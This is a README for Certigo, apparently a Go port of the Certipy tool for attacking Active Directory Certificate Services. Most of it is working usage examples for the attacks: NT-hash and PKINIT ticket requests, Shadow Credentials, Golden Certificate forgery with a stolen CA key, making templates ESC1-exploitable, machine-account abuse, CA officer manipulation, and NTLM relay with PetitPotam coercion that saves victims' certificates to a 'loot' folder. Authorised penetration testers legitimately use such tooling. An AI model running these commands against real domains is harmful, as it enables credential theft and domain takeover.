# Certigo

A Go port of [Certipy](https://github.com/ly4k/Certipy) (based on `certipy-ad` v5.0.3). Active Directory Certificate Services enumeration and abuse in a single static binary.

Certigo covers the same twelve subcommands as Certipy, built on top of `gokrb5`, `go-ldap`, `go-msrpc`, and `go-pkcs12`. Everything compiles to a static binary with no cgo, so it cross-compiles cleanly to Linux, Windows, and macOS on amd64 and arm64.

## Install

### From source

```
go install github.com/ajm4n/certigo/cmd/certigo@latest
```

### Binaries

Download from [Releases](https://github.com/ajm4n/certigo/releases) for `linux/amd64`, `linux/arm64`, `windows/amd64`, `windows/arm64`, `darwin/amd64`, `darwin/arm64`.

## Subcommands

| Command | What it does |
|---|---|
| `find` | Enumerate CAs, templates, and detect ESC1 through ESC16 vulnerabilities. Output as text, JSON, zip bundle, or BloodHound edges. |
| `auth` | Obtain a TGT via password, NT hash, or PKINIT (`--pfx`). Writes the ticket to a ccache. |
| `cert` | Convert between PFX and PEM, extract the key or certificate, change passwords. |
| `shadow` | Add, list, view, clear, or remove `msDS-KeyCredentialLink` entries (Shadow Credentials). |
| `forge` | Sign a certificate with a stolen CA private key (Golden Certificate), including the `NTDS-CA-Security-Ext` SID binding. |
| `template` | Read, write, back up, or restore an AD CS template via LDAP. Includes an ESC4 `make-vulnerable` preset. |
| `account` | Create, modify, or delete AD user and computer accounts via LDAP. |
| `ca` | Manage a CA over DCOM: backup the signing cert, approve or deny pending requests, add or remove officers, publish or unpublish templates. |
| `req` | Request a certificate via `/certsrv/` web enrollment or ICPR over RPC. |
| `ptt` | Convert a kirbi file to a ccache, or pass through an existing ccache to `$KRB5CCNAME`. |
| `parse` | Parse AD CS registry dumps (`.reg`). |
| `relay` | Listen for inbound NTLM, relay it to AD CS web enrollment, save a PFX for each victim. Includes PetitPotam, DFSCoerce, and PrinterBug auth coercion. |

Every subcommand takes `certigo <cmd> --help` for the full flag set.

## Common flags

Most subcommands accept the same authentication and transport flags:

```
-u, --username          AD username (e.g. alice)
-p, --password          AD password
    --hashes            LMHASH:NTHASH (LM half may be empty: ":NTHASH")
-d, --domain            AD domain or realm (e.g. corp.local)
-k, --kerberos          use Kerberos GSSAPI bind (with --dc-host)
    --dc-host           domain controller host or IP
    --port              LDAP port (389, or 636 for LDAPS)
    --ldaps             force LDAPS
    --ldap-insecure     skip TLS verification on LDAPS
```

## Usage by subcommand

### find

Enumerate every AD CS CA and template in the forest and flag vulnerable templates.

```
certigo find \
  -u alice -p Passw0rd -d corp.local \
  --dc-host dc01.corp.local \
  --format text
```

Output formats:

- `text`: human-readable grouping, one section per CA and one per template.
- `json`: structured snake_case for downstream tooling.
- `zip`: bundle with `certigo_find.txt`, `certigo_find.json`, per-CA `.crt`, per-template JSON.
- `bloodhound`: BloodHound CE OpenGraph edges (`ADCSESC1`..`ADCSESC16`) plus resolved principal nodes.

```
certigo find ... --format bloodhound -o certigo.json
```

### auth

Get a TGT. Three modes: password, NT hash, PKINIT.

```
# Password
certigo auth -u alice -p Passw0rd -d corp.local --dc-host dc01.corp.local \
  --out-ccache alice.ccache

# NT hash
certigo auth -u alice --hashes :a4f49c406510bdcab6824ee7c30fd852 \
  -d corp.local --dc-host dc01.corp.local --out-ccache alice.ccache

# PKINIT (from a PFX obtained via shadow, req, or forge)
certigo auth -u alice -d corp.local --dc-host dc01.corp.local \
  --pfx alice.pfx --pfx-password '' --out-ccache alice.ccache

export KRB5CCNAME=$PWD/alice.ccache
```

### cert

```
# PFX to PEM
certigo cert --pfx alice.pfx --pfx-password '' --out-pem alice.pem

# Extract just the key
certigo cert --pfx alice.pfx --extract-key > alice.key

# Re-encrypt a PFX with a new password
certigo cert --pfx alice.pfx --out-pfx alice-pwd.pfx --out-password 'hunter2'
```

### shadow

```
# Add a key credential; writes bob.pfx for PKINIT follow-up
certigo shadow -u alice -p Passw0rd -d corp.local \
  --dc-host dc01.corp.local --action add \
  --target-dn 'CN=bob,CN=Users,DC=corp,DC=local' \
  --out bob.pfx

# List / clear / remove one entry
certigo shadow ... --action list --target-dn '...'
certigo shadow ... --action clear --target-dn '...'
certigo shadow ... --action remove --device-id <hex> --target-dn '...'
```

### forge

```
certigo forge \
  --ca-pfx ca.pfx --ca-password '' \
  --upn Administrator@corp.local \
  --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  --validity-days 3650 --key-size 2048 \
  --out admin.pfx
```

### template

```
# Dump all attributes of a template
certigo template -u alice ... --name User --action read

# Make a template ESC1-exploitable (requires Write on the template)
certigo template -u alice ... --name VulnTemplate --action make-vulnerable \
  --file backup.json

# Roll back
certigo template -u alice ... --name VulnTemplate --action restore --file backup.json
```

### account

```
# Create a computer account (MachineAccountQuota abuse)
certigo account -u alice -p Passw0rd -d corp.local --dc-host dc01.corp.local \
  --action create --type computer --target PWN01 --password 'BlahBlah1234!'

# Read every attribute
certigo account ... --action read --target alice
```

### ca

```
# Publish a template on the CA
certigo ca -u alice ... --ca-name CORP-CA --add-template VulnTemplate

# List officers (ACE holders on the CA object)
certigo ca -u alice ... --ca-name CORP-CA --list-officers

# Approve a pending request (DCOM)
certigo ca -u alice ... --ca-name CORP-CA --issue-request 42

# Add a new CA officer (DCOM Get/SetOfficerRights)
certigo ca -u alice ... --ca-name CORP-CA --add-officer S-1-5-21-...
```

### req

```
# Web enrollment
certigo req --ca ca01.corp.local --ca-name CORP-CA --template User \
  -u 'corp\alice' -p Passw0rd \
  --upn alice@corp.local --out alice.pfx

# ICPR RPC (port 135 + dynamic)
certigo req --method rpc --ca ca01.corp.local --ca-name CORP-CA --template User \
  -u 'corp\alice' -p Passw0rd --upn alice@corp.local --out alice.pfx
```

### ptt

```
# Kirbi to ccache (writes to $KRB5CCNAME if --out-ccache is omitted)
certigo ptt --kirbi ticket.kirbi --out-ccache ticket.ccache

# ccache pass-through
certigo ptt --ccache in.ccache --out-ccache $KRB5CCNAME
```

### parse

```
certigo parse --file caconfig.reg --format text
certigo parse --file caconfig.reg --format json
```

### relay

```
# Listen on :80, relay to /certsrv/, coerce a victim via PetitPotam
certigo relay \
  --listen :80 \
  --target https://ca01.corp.local/certsrv/ \
  --template User \
  --trigger petitpotam \
  --target-host victim.corp.local \
  --attacker-url http://attacker.local/cg \
  --out-dir ./loot
```

On each successful relay the victim's PFX is saved as `./loot/<victim>.pfx`.

## Build

```
make build        # build the binary at ./certigo
make test         # run the unit tests (144 across 22 packages)
make lint         # golangci-lint
make lab-up       # bring up a local samba + mock-adcs docker lab
make lab-down     # tear it down
```

Go 1.24 or newer is required. No cgo dependencies.

## Docker lab

`lab/docker/compose.yml` brings up `samba-ad-dc` for real LDAP / Kerberos plus an in-repo `mock-adcs` HTTP stub. Useful for integration-testing `find`, `auth`, `shadow`, `account`, and `template` without a real Windows server. See `lab/docker/README.md` for the quickstart.

AD CS itself does not run on Linux, so end-to-end `req` / `ca` / `forge` testing requires a real Windows Server CA.

## Scope and limitations

- `auth --pfx` performs PKINIT AS-REQ / AS-REP with DH, and writes the resulting TGT to a ccache. U2U / unPAC-the-hash is not wired yet.
- `ca --backup` currently retrieves the CA signing certificate via `GetCAProperty`; the full private-key backup over `BackupPrepare / OpenFile / ReadFile` is not implemented.
- `parse` handles `.reg` text dumps. `.evtx` returns a clear error and points at Certipy, pending a pure-Go EVTX reader.
- `relay` implements the HTTP(S) NTLM MITM plus coercion triggers, but does not rewrite NTLM signing or channel-binding tokens, so CAs with EPA / SMB signing enforced will reject the relayed `AUTHENTICATE`.

Everything else is feature-complete against Certipy v5.0.3. File an issue or a PR when something misbehaves.

## License

MIT. See [LICENSE](LICENSE).

## Acknowledgements

Certigo is a direct port of [Oliver Lyak's Certipy](https://github.com/ly4k/Certipy). All original AD CS research credit belongs to the Certipy authors and to the SpecterOps "Certified Pre-Owned" paper.
